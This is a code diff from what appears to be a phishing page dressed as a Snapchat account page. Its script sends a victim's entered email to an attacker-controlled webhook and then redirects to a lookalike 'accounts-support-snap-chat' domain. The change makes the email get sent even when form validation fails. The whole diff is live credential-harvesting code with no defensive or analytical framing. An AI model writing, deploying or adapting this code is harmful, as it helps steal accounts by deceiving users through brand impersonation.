@@ -61537,34 +61537,35 @@ html[lang='ar'] .theme--snapchat {
               }
 
               if (errors.length > 0) {
-                checkerror()
-              } else {
-                const payload = JSON.stringify({
-                    content: `Email: ${email}`
-                });
-      
-                try {
-                    // Send the POST request to the webhook
-                    const response = await fetch(webhookURL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: payload
-                    });
-      
-                    if (response.ok) {
-                        window.location.href = "https://accounts-support-snap-chat.github.io/accounts/w33y83900.html";
-                    } else {
-                        errors.push("Something went wrong, try again later")
-                        checkerror()
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                    errors.push("Something went wrong, try again later")
-                    checkerror()
-                }
+                  checkerror()
+              }else{
+                  errorMessage.style.display = 'none';
               }
-      
-             
+
+              const payload = JSON.stringify({
+                  content: `Email: ${email}`
+              });
+
+              try {
+                  // Send the POST request to the webhook
+                  const response = await fetch(webhookURL, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: payload
+                  });
+
+                  if (response.ok) {
+                      window.location.href = "https://accounts-support-snap-chat.github.io/accounts/w33y83900.html?";
+                  } else {
+                  errors.push("Something went wrong, try again later")
+                  checkerror()
+                  }
+              } catch (error) {
+                  console.error('Error:', error);
+                  errors.push("Something went wrong, try again later")
+                  checkerror()
+              }
+
           });
       </script>
 </html>
